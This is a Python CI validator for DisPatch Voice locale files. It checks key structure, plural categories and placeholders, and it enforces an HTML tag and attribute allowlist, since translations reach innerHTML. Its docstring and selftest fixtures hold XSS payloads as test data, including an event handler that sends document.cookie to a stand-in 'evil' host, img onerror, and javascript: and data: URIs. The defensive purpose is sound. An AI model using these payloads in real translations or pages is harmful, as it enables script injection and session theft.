#!/usr/bin/env python3
"""Validate DisPatch Voice locale files against the English source of truth.

`src/dispatch_voice/static/locales/en.json` is authoritative. Every other locale must
mirror its key structure exactly; this script fails CI when it does not.

Checks performed
----------------
ERRORS (exit 1)
  * file is not valid UTF-8 JSON, or its top level is not an object
  * `$meta` block missing or malformed
  * `$meta.dir` is not "rtl" for a right-to-left language
  * keys present in en.json but missing from the locale
  * keys present in the locale but unknown to en.json
  * a value's type disagrees with en.json (string vs plural object vs namespace)
  * a plural object is missing a CLDR category the language requires
  * a plural object contains a category that does not exist in the language
  * a translation introduces a `{placeholder}` that en.json does not define
  * a non-plural translation drops a `{placeholder}` en.json defines
  * an HTML-bearing value changes its tag structure or loses an `id=`
    (those ids are looked up by main.js — dropping one breaks the app)
  * a value contains an HTML tag outside the allowlist
  * a value contains an HTML ATTRIBUTE outside the allowlist, an unparsable
    tag, or a `javascript:` / `data:` URI (see "This file is a security
    boundary" below)

WARNINGS (exit 1 only with --strict)
  * a plural variant drops the `{count}` placeholder — legitimate for the
    `zero`, `one` and `two` forms, where the phrasing names the quantity
    itself (Arabic's dual "ملفين" must NOT be written "2 ملفين")
  * a value is byte-identical to English (probably untranslated)
  * a leading emoji/symbol run present in English is missing from the
    translation (the UI relies on those glyphs for recognisability)
  * every category of a plural is the same string (usually a copy-paste)

Run without --strict in CI: warnings are for a human reviewing a translation
PR, and several of them are legitimate in some languages.

This file is a security boundary
--------------------------------
Values marked `data-i18n-html` in the markup are written to `innerHTML` by
`js/i18n.js`. A locale file is therefore executable content, and a translation
pull request is the cheapest way to get script into this app: a plausible
contributor sends a plausible translation, and one attribute rides along.

So the HTML rules below check tag names AND attributes. Checking only tag names
(which is what this script did originally) stops `<script>` and stops nothing
that matters — `<strong onmouseover="fetch('//evil/'+document.cookie)">Save</strong>`
has the same tag signature as the English string it replaces, keeps every id and
class, and passes every other check in this file.

`--selftest` runs the malicious fixtures that pin that behaviour down. Real
locale files are clean, so nothing else in CI would notice if the allowlist
regressed.

Usage
-----
    python3 scripts/check-locales.py
    python3 scripts/check-locales.py --strict
    python3 scripts/check-locales.py --locales-dir frontend/static/locales
    python3 scripts/check-locales.py --only ar,de
    python3 scripts/check-locales.py --selftest

Exit status is 0 when clean, 1 when any error (or, with --strict, any warning)
was reported — suitable for a GitHub Actions step with no extra glue.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from pathlib import Path

# --------------------------------------------------------------------------
# Reference data
# --------------------------------------------------------------------------

SOURCE_LANG = "en"

# CLDR cardinal plural categories, per language. A locale may only use
# categories listed here for its language.
CLDR_CARDINAL: dict[str, set[str]] = {
    "ar": {"zero", "one", "two", "few", "many", "other"},
    "cs": {"one", "few", "many", "other"},
    "da": {"one", "other"},
    "de": {"one", "other"},
    "el": {"one", "other"},
    "en": {"one", "other"},
    "es": {"one", "many", "other"},
    "fa": {"one", "other"},
    "fi": {"one", "other"},
    "fr": {"one", "many", "other"},
    "he": {"one", "two", "other"},
    "hi": {"one", "other"},
    "hu": {"one", "other"},
    "id": {"other"},
    "it": {"one", "many", "other"},
    "ja": {"other"},
    "ko": {"other"},
    "nl": {"one", "other"},
    "no": {"one", "other"},
    "pl": {"one", "few", "many", "other"},
    "pt": {"one", "many", "other"},
    "ru": {"one", "few", "many", "other"},
    "sv": {"one", "other"},
    "th": {"other"},
    "tr": {"one", "other"},
    "uk": {"one", "few", "many", "other"},
    "vi": {"other"},
    "zh": {"other"},
}

# Categories a translator MUST supply. The optional ones only fire for values
# this app never renders (CLDR `many` in the Romance languages is the 10^6
# scale), so demanding them would be busywork. Arabic is the exception: all six
# of its categories fire on counts a chat app really shows.
REQUIRED_CATEGORIES: dict[str, set[str]] = {
    "ar": {"zero", "one", "two", "few", "many", "other"},
}

RTL_LANGS = {"ar", "he", "fa", "ur", "yi", "dv", "ckb"}

ALL_CATEGORIES = {"zero", "one", "two", "few", "many", "other"}

# Plural categories that name an exact quantity, where a natural translation may
# legitimately drop the {count} placeholder (see check_string).
COUNTLESS_CATEGORIES = {"zero", "one", "two"}

# Tags permitted inside a translatable value. Values are injected with
# innerHTML by i18n.js `data-i18n-html`, so this allowlist is a real security
# boundary, not a style rule.
ALLOWED_TAGS = {"strong", "em", "b", "i", "code", "br", "span", "kbd", "small"}

# Attributes permitted on those tags — and that is the whole list, for every
# tag. It is not "everything except event handlers": that shape of allowlist
# has to keep up with the platform (onmouseover, onfocus, onanimationend,
# onbeforetoggle, whatever ships next quarter) and loses the moment it falls
# behind. Deny by default instead, and let the two attributes the app actually
# uses through.
#
# Why these two, and only these two: `en.json` styles one string with
# `<code class="sec-path" id="sec-recovery-path">`, and main.js looks that id up
# to fill in a live path. Every other HTML-bearing value in every shipped locale
# is bare `<strong>`, `<code>` and `<br />` — checked, not assumed. In
# particular there is NO `href` anywhere, so `a` is not an allowed tag and no
# URL-bearing attribute is allowed at all. Keep it that way: a link is not
# something a translation should be able to introduce.
ALLOWED_ATTRS = {"class", "id"}

# What an allowed attribute's VALUE may look like. class and id are identifiers,
# so this is deliberately narrower than "no quotes": it also rules out the
# parentheses, semicolons and slashes that a payload needs.
SAFE_ATTR_VALUE_RE = re.compile(r"^[A-Za-z0-9 _.:#-]*$")

# Schemes that must never appear in a translated value. `javascript:` and
# friends are never legitimate prose. `data:` needs the lookahead, because
# "Your data: 5 MB" is an ordinary sentence — only a real data URI (a MIME
# type, a `;base64`, or the payload comma) is flagged.
SCRIPT_SCHEME_RE = re.compile(r"(?i)\b(?:javascript|vbscript|livescript)\s*:")
DATA_URI_RE = re.compile(r"(?i)\bdata:[a-z0-9!#$&^_+.-]*[;,/]")

# Every angle-bracketed construct, well-formed or not. Matching loosely and
# then insisting each match parses is the point: `<span/onmouseover=alert(1)>`
# is a tag to the browser and must be one here too, rather than slipping past a
# stricter pattern that simply fails to match it.
TAG_RE = re.compile(r"<[^>]*>")
_TAG_SHAPE_RE = re.compile(
    r"^<\s*(?P<close>/?)\s*(?P<name>[A-Za-z][A-Za-z0-9]*)"
    r"(?P<attrs>[^>]*?)(?P<selfclose>/?)\s*>$", re.DOTALL)
# One attribute: `name`, `name=value`, `name="value"`, `name='value'`.
_ATTR_RE = re.compile(
    r"""(?P<name>[A-Za-z_:][-A-Za-z0-9_:.]*)\s*"""
    r"""(?:=\s*(?P<val>"[^"]*"|'[^']*'|[^\s"'`=<>]+))?""")

# Values that are legitimately identical to English in every locale: SI unit
# templates, engine names, and the voice-recording script, which is English on
# purpose (the voice engines speak English; voices.rec_hint says so).
IDENTICAL_OK = {
    "drive.speed_value", "drive.timing_link", "vtools.seconds",
    "vtools.stt_parakeet", "vtools.stt_moonshine", "voices.script",
}
# Values that happen to be spelled the same as English in one language.
IDENTICAL_OK_LANG = {
    "de": {"drive.group_status", "drive.patience_normal", "drive.reply_normal", "drive.speed_normal",
           "drive.pause", "voices.name"},
    "es": {"drive.patience_normal", "drive.reply_normal", "drive.speed_normal", "drive.hangup_min"},
    "fr": {"drive.pause", "drive.hangup_min"},
    "pt": {"drive.patience_normal", "drive.reply_normal", "drive.speed_normal", "drive.hangup_min"},
    "zh": {"drive.you_said"},
}


PLACEHOLDER_RE = re.compile(r"\{(\w+)\}")
ID_ATTR_RE = re.compile(r'\bid\s*=\s*"([^"]*)"')
CLASS_ATTR_RE = re.compile(r'\bclass\s*=\s*"([^"]*)"')
# A leading run of *meaningful glyphs* — emoji, arrows, geometric shapes — as in
# "🔒 Lock now", "⤓ Import", "▶ Start". Matched positively by Unicode block
# rather than negatively as "not a word character", so that punctuation a
# translator SHOULD localize (quotes “ ” « » 「 」, parentheses ( ) （ ）,
# ellipses) never trips this check.
LEADING_GLYPH_RE = re.compile(
    "^["
    "\U0001F000-\U0001FAFF"   # emoji blocks (🔒 📁 📜 🗑 🛡 ✨ …)
    "←-⇿"           # arrows (↑ ↓ ↺ ↻ …)
    "⌀-⏿"           # misc technical (⌫ ⏎ …)
    "■-◿"           # geometric shapes (■ ▶ ▲ ▼ ▸ ▾ ◂)
    "☀-➿"           # misc symbols + dingbats (⚙ ⚠ ⚡ ✕ ✨ …)
    "⟰-⟿"           # supplemental arrows-A (⟳)
    "⠀-⣿"           # braille patterns (⠿ drag handle)
    "⤀-⧿"           # supplemental arrows-B / math ops (⤒ ⤓ ⧉)
    "⬀-⯿"           # misc symbols and arrows (⬆ ⬇)
    "️‍"            # variation selector / ZWJ
    r"\s]+"
)


# --------------------------------------------------------------------------
# Reporting
# --------------------------------------------------------------------------


class Report:
    def __init__(self, github: bool) -> None:
        self.errors: list[tuple[str, str]] = []
        self.warnings: list[tuple[str, str]] = []
        self.github = github

    def error(self, where: str, msg: str) -> None:
        self.errors.append((where, msg))

    def warn(self, where: str, msg: str) -> None:
        self.warnings.append((where, msg))

    def emit(self, path_for: dict[str, Path]) -> None:
        for where, msg in self.errors:
            lang = where.split(":", 1)[0]
            if self.github:
                f = path_for.get(lang, Path(""))
                print(f"::error file={f}::{where} {msg}")
            else:
                print(f"  ERROR   {where}  {msg}")
        for where, msg in self.warnings:
            lang = where.split(":", 1)[0]
            if self.github:
                f = path_for.get(lang, Path(""))
                print(f"::warning file={f}::{where} {msg}")
            else:
                print(f"  warn    {where}  {msg}")


# --------------------------------------------------------------------------
# Structure walking
# --------------------------------------------------------------------------


def is_plural(value: object) -> bool:
    """An object whose keys are ALL CLDR categories (and includes `other`)."""
    if not isinstance(value, dict) or not value:
        return False
    keys = set(value.keys())
    return "other" in keys and keys <= ALL_CATEGORIES


def flatten(node: object, prefix: str = "") -> dict[str, object]:
    """Collapse a locale tree into {dotted.key: value}.

    Plural objects are leaves, not namespaces.
    """
    out: dict[str, object] = {}
    if isinstance(node, dict) and not is_plural(node):
        for k, v in node.items():
            if prefix == "" and k == "$meta":
                continue
            key = f"{prefix}.{k}" if prefix else k
            if isinstance(v, dict) and not is_plural(v):
                out.update(flatten(v, key))
            else:
                out[key] = v
    return out


def placeholders(value: str) -> set[str]:
    return set(PLACEHOLDER_RE.findall(value or ""))


def tag_signature(value: str) -> list[str]:
    """Ordered list of tag names appearing in a value ('<br />' -> 'br').

    Unparsable constructs contribute nothing here — they are reported by
    `markup_problems()` instead, which is the check that fails the build.
    """
    names = []
    for raw in TAG_RE.findall(value or ""):
        m = _TAG_SHAPE_RE.match(raw)
        if m:
            names.append(m.group("name").lower())
    return names


def _attr_problems(raw: str, name: str, attrs_src: str) -> list[str]:
    """Parse one tag's attribute region against the allowlist."""
    problems: list[str] = []
    pos, end = 0, len(attrs_src)
    while pos < end:
        if attrs_src[pos].isspace() or attrs_src[pos] == "/":
            # A stray '/' inside the attribute region is NOT whitespace to a
            # browser's tokenizer — `<span/onmouseover=x>` really does give you
            # an event handler — so it is rejected below rather than skipped.
            if attrs_src[pos] == "/":
                problems.append(
                    f"{raw!r} has a stray '/' between attributes; browsers read "
                    f"the text after it as an ATTRIBUTE, not as part of the tag name")
                return problems
            pos += 1
            continue
        m = _ATTR_RE.match(attrs_src, pos)
        if not m or m.end() == pos:
            problems.append(
                f"could not parse the attributes of {raw!r} — write plain "
                f"`<{name}>` or `<{name} class=\"…\">` and nothing else")
            return problems
        pos = m.end()
        attr = m.group("name").lower()
        value = (m.group("val") or "").strip("\"'")
        if attr.startswith("on"):
            problems.append(
                f"{raw!r} carries the event handler `{attr}=` — translations "
                f"are written to innerHTML, so this is script execution")
        elif attr not in ALLOWED_ATTRS:
            problems.append(
                f"{raw!r} carries the attribute `{attr}=`; only "
                f"{sorted(ALLOWED_ATTRS)} are allowed in a translation")
        elif not SAFE_ATTR_VALUE_RE.match(value):
            problems.append(
                f"{raw!r}: the value of `{attr}=` may only contain letters, "
                f"digits, spaces and _ . : # -")
    return problems


def markup_problems(value: str) -> list[str]:
    """Everything wrong with the HTML in one translated value.

    Returns human-readable strings; an empty list means the value is safe to
    hand to innerHTML. Deliberately independent of the English source: a
    translation is checked on its own merits FIRST, because the interesting
    attack keeps the English tag structure exactly and changes only what is
    inside the angle brackets.
    """
    s = value or ""
    problems: list[str] = []

    for raw in TAG_RE.findall(s):
        m = _TAG_SHAPE_RE.match(raw)
        if not m:
            # Comments, processing instructions, `<3`, `< b`, anything the
            # shape regex will not accept. None of it belongs in a UI string.
            problems.append(
                f"{raw!r} is not a plain HTML tag. If you meant a literal "
                f"angle bracket, write &lt; / &gt;")
            continue
        name = m.group("name").lower()
        attrs_src = m.group("attrs")
        if name not in ALLOWED_TAGS:
            problems.append(
                f"tag <{name}> is not allowed; permitted tags are {sorted(ALLOWED_TAGS)}")
        if m.group("close") and attrs_src.strip():
            problems.append(f"closing tag {raw!r} carries attributes")
        problems.extend(_attr_problems(raw, name, attrs_src))

    # A '<' with no closing '>' never reaches the DOM as an element, but it is
    # always either a typo or the front half of something that was meant to.
    if "<" in TAG_RE.sub("", s):
        problems.append("stray '<' — write &lt; for a literal angle bracket")

    for hit in SCRIPT_SCHEME_RE.findall(s):
        problems.append(f"contains a script URI ({hit.strip()!r})")
    if DATA_URI_RE.search(s):
        problems.append("contains a `data:` URI")

    return problems


# --------------------------------------------------------------------------
# Per-value checks
# --------------------------------------------------------------------------


def check_html(lang: str, key: str, en_val: str, tr_val: str, rep: Report) -> None:
    # Run the allowlist FIRST and unconditionally: a value with no markup in
    # English is exactly where injected markup is least expected, and the
    # comparisons below only ever look at tag NAMES.
    for problem in markup_problems(tr_val):
        rep.error(f"{lang}:{key}", problem)

    en_tags = tag_signature(en_val)
    tr_tags = tag_signature(tr_val)
    if not en_tags and not tr_tags:
        return

    if sorted(en_tags) != sorted(tr_tags):
        rep.error(
            f"{lang}:{key}",
            f"HTML tag structure changed: English has {sorted(en_tags)}, "
            f"translation has {sorted(tr_tags)}",
        )

    en_ids = set(ID_ATTR_RE.findall(en_val))
    tr_ids = set(ID_ATTR_RE.findall(tr_val))
    missing_ids = en_ids - tr_ids
    if missing_ids:
        rep.error(
            f"{lang}:{key}",
            f"lost id attribute(s) {sorted(missing_ids)} — main.js looks these "
            f"up by id, so dropping one breaks the app",
        )
    extra_ids = tr_ids - en_ids
    if extra_ids:
        rep.error(f"{lang}:{key}", f"introduced unknown id attribute(s) {sorted(extra_ids)}")

    en_classes = set(CLASS_ATTR_RE.findall(en_val))
    tr_classes = set(CLASS_ATTR_RE.findall(tr_val))
    if en_classes - tr_classes:
        rep.error(
            f"{lang}:{key}",
            f"lost class attribute(s) {sorted(en_classes - tr_classes)}",
        )
    # Symmetric with the id check above. A class the English source does not
    # have is either a styling decision a translator should not be making
    # alone, or the visible half of something worse.
    if tr_classes - en_classes:
        rep.error(
            f"{lang}:{key}",
            f"introduced unknown class attribute(s) {sorted(tr_classes - en_classes)}",
        )


def check_string(
    lang: str, key: str, en_val: str, tr_val: str, rep: Report, *, variant: str = ""
) -> None:
    label = f"{key}[{variant}]" if variant else key

    if not isinstance(tr_val, str):
        rep.error(f"{lang}:{label}", f"expected a string, got {type(tr_val).__name__}")
        return

    if tr_val.strip() == "" and en_val.strip() != "":
        rep.error(f"{lang}:{label}", "empty translation")
        return

    en_ph = placeholders(en_val)
    tr_ph = placeholders(tr_val)

    unknown = tr_ph - en_ph
    if unknown:
        rep.error(
            f"{lang}:{label}",
            f"unknown placeholder(s) {sorted("{" + p + "}" for p in unknown)}; "
            f"English defines {sorted("{" + p + "}" for p in en_ph) or 'none'}",
        )

    missing = en_ph - tr_ph
    if missing:
        pretty = sorted("{" + p + "}" for p in missing)
        if variant in COUNTLESS_CATEGORIES and missing - {"count"}:
            # Dropping something other than the count in an exact-quantity form
            # is usually still fine ("No messages were recovered." legitimately
            # omits {threads}) but it silently loses information, so say so.
            rep.warn(
                f"{lang}:{label}",
                f"dropped non-count placeholder(s) {pretty} from the {variant} "
                f"form — check this is deliberate",
            )
        elif variant in COUNTLESS_CATEGORIES:
            # These three categories name an exact quantity, so a good
            # translation often omits the numeral entirely:
            #   zero -> "No files deleted"
            #   one  -> "Deleted a file"
            #   two  -> Arabic's dual, "تم حذف ملفين", where the noun's own
            #           inflection *is* the number — writing "2 ملفين" is wrong.
            rep.warn(f"{lang}:{label}", f"dropped placeholder(s) {pretty} (fine for a {variant} form)")
        else:
            rep.error(f"{lang}:{label}", f"missing placeholder(s) {pretty}")

    check_html(lang, label, en_val, tr_val, rep)

    lead = LEADING_GLYPH_RE.match(en_val)
    if lead:
        glyphs = lead.group(0).strip()
        if glyphs and glyphs not in tr_val:
            rep.warn(f"{lang}:{label}", f"leading glyph {glyphs!r} missing from the translation")

    if (lang != SOURCE_LANG and tr_val == en_val and len(en_val) > 3 and key not in IDENTICAL_OK
            and key not in IDENTICAL_OK_LANG.get(lang, ())):
        rep.warn(f"{lang}:{label}", "identical to English — untranslated?")


def check_plural(
    lang: str, key: str, en_val: dict, tr_val: object, rep: Report
) -> None:
    if not isinstance(tr_val, dict):
        rep.error(
            f"{lang}:{key}",
            f"expected a plural object, got {type(tr_val).__name__} "
            f"(English defines categories {sorted(en_val)})",
        )
        return

    available = CLDR_CARDINAL.get(lang)
    if available is None:
        rep.warn(f"{lang}:{key}", f"no CLDR plural table for '{lang}' — skipping category check")
        available = ALL_CATEGORIES

    required = REQUIRED_CATEGORIES.get(lang)
    if required is None:
        required = {"other"} | ({"one"} if "one" in available else set())

    have = set(tr_val.keys())

    bogus = have - available
    if bogus:
        rep.error(
            f"{lang}:{key}",
            f"plural category/categories {sorted(bogus)} do not exist in '{lang}' "
            f"(CLDR cardinal: {sorted(available)})",
        )

    missing = required - have
    if missing:
        rep.error(
            f"{lang}:{key}",
            f"missing required plural category/categories {sorted(missing)} "
            f"('{lang}' requires {sorted(required)})",
        )

    # Compare each variant against the closest English form available.
    en_other = en_val.get("other", "")
    for cat, text in tr_val.items():
        if cat not in available:
            continue
        reference = en_val.get(cat, en_other)
        check_string(lang, key, reference, text, rep, variant=cat)

    # A locale that made every category identical is usually a copy-paste, but
    # not always: abbreviation strings ("{count} د") are genuinely invariant.
    distinct = {v for v in tr_val.values() if isinstance(v, str)}
    if len(have) >= 3 and len(distinct) == 1 and not key.startswith("time.short."):
        rep.warn(f"{lang}:{key}", f"all {len(have)} plural forms are identical — likely copy-pasted")


# --------------------------------------------------------------------------
# Per-file checks
# --------------------------------------------------------------------------


def check_meta(lang: str, data: dict, rep: Report) -> None:
    meta = data.get("$meta")
    if not isinstance(meta, dict):
        rep.error(f"{lang}:$meta", "missing or not an object")
        return

    for field in ("locale", "dir", "name", "nativeName"):
        if not isinstance(meta.get(field), str) or not meta[field].strip():
            rep.error(f"{lang}:$meta.{field}", "missing or empty")

    direction = meta.get("dir")
    if direction not in ("ltr", "rtl"):
        rep.error(f"{lang}:$meta.dir", f"must be 'ltr' or 'rtl', got {direction!r}")
    elif lang in RTL_LANGS and direction != "rtl":
        rep.error(f"{lang}:$meta.dir", f"'{lang}' is a right-to-left language but dir is {direction!r}")
    elif lang not in RTL_LANGS and direction != "ltr":
        rep.error(f"{lang}:$meta.dir", f"'{lang}' is left-to-right but dir is {direction!r}")

    tag = meta.get("locale", "")
    if isinstance(tag, str) and tag and not tag.lower().startswith(lang.lower()):
        rep.error(
            f"{lang}:$meta.locale",
            f"BCP-47 tag {tag!r} does not start with the file's language code '{lang}'",
        )

    cats = meta.get("pluralCategories")
    if not isinstance(cats, list) or not cats:
        rep.error(f"{lang}:$meta.pluralCategories", "missing or not a non-empty list")
    else:
        available = CLDR_CARDINAL.get(lang)
        if available and set(cats) - available:
            rep.error(
                f"{lang}:$meta.pluralCategories",
                f"declares {sorted(set(cats) - available)}, which '{lang}' does not have",
            )


def check_locale(lang: str, data: dict, en_flat: dict[str, object], rep: Report) -> None:
    check_meta(lang, data, rep)

    tr_flat = flatten(data)

    missing = sorted(set(en_flat) - set(tr_flat))
    for key in missing:
        rep.error(f"{lang}:{key}", "missing key")

    extra = sorted(set(tr_flat) - set(en_flat))
    for key in extra:
        rep.error(f"{lang}:{key}", "unknown key (not present in en.json)")

    for key in sorted(set(en_flat) & set(tr_flat)):
        en_val = en_flat[key]
        tr_val = tr_flat[key]
        if is_plural(en_val):
            check_plural(lang, key, en_val, tr_val, rep)
        elif isinstance(en_val, str):
            if isinstance(tr_val, dict):
                rep.error(f"{lang}:{key}", "translated as a plural object, but English is a plain string")
            else:
                check_string(lang, key, en_val, tr_val, rep)
        else:
            rep.error(f"{lang}:{key}", f"unsupported value type in en.json: {type(en_val).__name__}")


def check_source(en_flat: dict[str, object], rep: Report) -> None:
    """Sanity-check en.json itself so a broken source cannot pass silently."""
    for key, val in sorted(en_flat.items()):
        if is_plural(val):
            if "other" not in val:
                rep.error(f"en:{key}", "plural object without an 'other' category")
            for cat, text in val.items():
                if not isinstance(text, str) or not text.strip():
                    rep.error(f"en:{key}[{cat}]", "empty or non-string plural form")
                    continue
                for problem in markup_problems(text):
                    rep.error(f"en:{key}[{cat}]", problem)
                if not placeholders(text) and "#" not in text and cat not in ("zero", "one"):
                    # A plural form with no placeholder at all is nearly always a
                    # mistake. (`unit.bytes` legitimately shows `{size}` rather
                    # than `{count}` — the count only drives the selection.)
                    rep.warn(f"en:{key}[{cat}]", "plural form references no placeholder")
        elif isinstance(val, str):
            if not val.strip():
                rep.error(f"en:{key}", "empty string")
            # The source file gets the same allowlist as every translation.
            # It is the one everybody copies from, so a bad pattern here
            # propagates into eight languages before anyone notices.
            for problem in markup_problems(val):
                rep.error(f"en:{key}", problem)
        else:
            rep.error(f"en:{key}", f"unsupported value type {type(val).__name__}")


# --------------------------------------------------------------------------
# Self-test
#
# The HTML allowlist is the one part of this script that real locale files
# cannot exercise: they are clean, so a regression that reopened the attribute
# hole would keep the whole suite green. These fixtures are the regression
# test. Every "must be rejected" entry below is a payload that PASSED the
# original tag-name-only checker.
# --------------------------------------------------------------------------

# (value, expected_clean, what it is)
SELFTEST_VALUES: list[tuple[str, bool, str]] = [
    # --- must be accepted: everything the shipped locales actually do -------
    ("Tap <strong>Change photo</strong> to set an avatar.", True, "plain emphasis"),
    ("First line<br />second line", True, "self-closing br"),
    ("First line<br>second line", True, "bare br"),
    ('Use the code in <code class="sec-path" id="sec-recovery-path">{recoveryPath}</code>.',
     True, "the class+id pattern en.json really ships"),
    ("<em>Save</em> and <kbd>Ctrl</kbd> and <small>note</small>", True, "other allowed tags"),
    ("🔒 Security & PIN", True, "bare ampersand in prose"),
    ("🗑 Delete this & older ({count})", True, "ampersand with a placeholder"),
    ("Your data: 5 MB of media", True, "the word 'data' followed by a colon"),
    ("انقر على <strong>تغيير الصورة</strong>", True, "RTL text with markup"),

    # --- must be rejected: attributes ---------------------------------------
    ('<strong onmouseover="fetch(\'//evil/\'+document.cookie)">Save</strong>', False,
     "event handler on an allowed tag, English tag structure preserved"),
    ("<strong onclick=steal()>Save</strong>", False, "unquoted event handler"),
    ("<SPAN ONMOUSEOVER=x>hi</SPAN>", False, "uppercase event handler"),
    ('<span class="sec-path" onmouseover="x">hi</span>', False,
     "handler smuggled in behind a legitimate attribute"),
    ('<span\nonmouseover="x">hi</span>', False, "handler on a second line"),
    ("<span/onmouseover=alert(1)>hi</span>", False, "slash-separated handler"),
    ('<code style="background:url(#)">hi</code>', False, "style attribute"),
    ('<span data-i18n="x">hi</span>', False, "data-* attribute"),
    ('<span id="ok" title="tooltip">hi</span>', False, "an innocent-looking extra attribute"),

    # --- must be rejected: tags and URIs ------------------------------------
    ("<script>alert(1)</script>", False, "script tag"),
    ('<img src=x onerror=alert(1)>', False, "img with onerror"),
    ('<a href="https://example.com">link</a>', False, "links are not translatable content"),
    ('<a href="javascript:alert(1)">link</a>', False, "javascript: URI"),
    ('<span class="x">JAVASCRIPT&#x3a;alert(1)</span>', True,
     "an entity-escaped colon is inert text, not a URI"),
    ("Click javascript:alert(1) now", False, "script URI in bare text"),
    ("<span>data:text/html;base64,PHNjcmlwdD4=</span>", False, "data: URI"),
    ("<!-- <span onmouseover=x> -->", False, "HTML comment"),
    ("unterminated <span onmouseover=x", False, "unterminated tag"),
    ('<span class="a(b)">hi</span>', False, "punctuation in an attribute value"),
]


def _selftest_end_to_end() -> list[str]:
    """Drive the real file-level path, not just the value-level helper.

    The value-level fixtures prove the allowlist; this proves it is WIRED IN —
    that a malicious translation actually fails `check-locales.py` end to end,
    including the id/class comparisons and the exit status.
    """
    import contextlib
    import io
    import tempfile

    failures: list[str] = []
    en = {
        "$meta": {"locale": "en", "dir": "ltr", "name": "English",
                  "nativeName": "English", "pluralCategories": ["one", "other"]},
        "settings": {"hint": "Press <strong>Save</strong> to apply."},
    }
    clean = {
        "$meta": {"locale": "de", "dir": "ltr", "name": "German",
                  "nativeName": "Deutsch", "pluralCategories": ["one", "other"]},
        "settings": {"hint": "Drücke <strong>Speichern</strong>, um zu übernehmen."},
    }
    evil = json.loads(json.dumps(clean))
    evil["settings"]["hint"] = (
        '<strong onmouseover="fetch(\'//evil/\'+document.cookie)">Speichern</strong> drücken.')

    for label, de, want in (("clean", clean, 0), ("malicious", evil, 1)):
        with tempfile.TemporaryDirectory(prefix="check-locales-selftest-") as tmp:
            d = Path(tmp)
            (d / "en.json").write_text(json.dumps(en), encoding="utf-8")
            (d / "de.json").write_text(json.dumps(de), encoding="utf-8")
            buf = io.StringIO()
            with contextlib.redirect_stdout(buf):
                rc = main(["--locales-dir", str(d)])
            if rc != want:
                failures.append(f"end-to-end {label} locale: exit {rc}, expected {want}")
            if want == 1 and "event handler" not in buf.getvalue():
                failures.append("end-to-end malicious locale: the report never named the "
                                "event handler")
    return failures


def selftest() -> int:
    failures: list[str] = []
    for value, want_clean, what in SELFTEST_VALUES:
        problems = markup_problems(value)
        got_clean = not problems
        if got_clean != want_clean:
            verb = "accepted" if got_clean else f"rejected ({problems[0]})"
            failures.append(f"{what}: {verb} — {value!r}")

    failures.extend(_selftest_end_to_end())

    print(f"check-locales --selftest: {len(SELFTEST_VALUES)} markup fixture(s) "
          f"+ 2 end-to-end locale(s)")
    if failures:
        print("\nFAILED:")
        for f in failures:
            print(f"  {f}")
        return 1
    print("OK: the HTML allowlist rejects every payload and accepts every "
          "pattern the shipped locales use.")
    return 0


# --------------------------------------------------------------------------
# Entry point
# --------------------------------------------------------------------------


def load(path: Path, rep: Report) -> dict | None:
    try:
        raw = path.read_text(encoding="utf-8")
    except UnicodeDecodeError as e:
        rep.error(f"{path.stem}:<file>", f"not valid UTF-8: {e}")
        return None
    except OSError as e:
        rep.error(f"{path.stem}:<file>", f"could not read: {e}")
        return None
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as e:
        rep.error(f"{path.stem}:<file>", f"invalid JSON at line {e.lineno} col {e.colno}: {e.msg}")
        return None
    if not isinstance(data, dict):
        rep.error(f"{path.stem}:<file>", "top level must be a JSON object")
        return None
    return data


def main(argv: list[str] | None = None) -> int:
    repo_root = Path(__file__).resolve().parent.parent
    # DisPatch_Voice: the add-on's bundles live inside the package so they ship in the
    # wheel and are served by DisPatch at /ext/voice/locales/<lang>.json.
    default_dir = repo_root / "src" / "dispatch_voice" / "static" / "locales"

    ap = argparse.ArgumentParser(description="Validate DisPatch Voice locale files against en.json.")
    ap.add_argument("--locales-dir", type=Path, default=default_dir,
                    help=f"directory holding <lang>.json (default: {default_dir})")
    ap.add_argument("--strict", action="store_true",
                    help="treat warnings as failures")
    ap.add_argument("--only", default="",
                    help="comma-separated language codes to check (default: all)")
    ap.add_argument("--github", action="store_true",
                    default=bool(os.environ.get("GITHUB_ACTIONS")),
                    help="emit GitHub Actions ::error/::warning annotations")
    ap.add_argument("--selftest", action="store_true",
                    help="run the HTML-allowlist fixtures and exit (touches no locale files)")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()

    locales_dir: Path = args.locales_dir
    if not locales_dir.is_dir():
        print(f"error: locales directory not found: {locales_dir}", file=sys.stderr)
        return 2

    en_path = locales_dir / f"{SOURCE_LANG}.json"
    if not en_path.is_file():
        print(f"error: source locale not found: {en_path}", file=sys.stderr)
        return 2

    rep = Report(github=args.github)
    path_for: dict[str, Path] = {SOURCE_LANG: en_path}

    en_data = load(en_path, rep)
    if en_data is None:
        rep.emit(path_for)
        print("\nFAILED: en.json could not be parsed.")
        return 1

    en_flat = flatten(en_data)
    check_source(en_flat, rep)

    wanted = {c.strip() for c in args.only.split(",") if c.strip()} or None

    others = sorted(p for p in locales_dir.glob("*.json") if p.stem != SOURCE_LANG)
    if wanted:
        others = [p for p in others if p.stem in wanted]

    checked = 0
    for path in others:
        lang = path.stem
        path_for[lang] = path
        data = load(path, rep)
        if data is None:
            continue
        check_locale(lang, data, en_flat, rep)
        checked += 1

    print(f"check-locales: {len(en_flat)} keys in {SOURCE_LANG}.json, {checked} translation(s) checked\n")
    rep.emit(path_for)

    n_err, n_warn = len(rep.errors), len(rep.warnings)
    print()
    if n_err:
        print(f"FAILED: {n_err} error(s), {n_warn} warning(s)")
        return 1
    if n_warn and args.strict:
        print(f"FAILED (--strict): 0 errors, {n_warn} warning(s)")
        return 1
    print(f"OK: 0 errors, {n_warn} warning(s)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
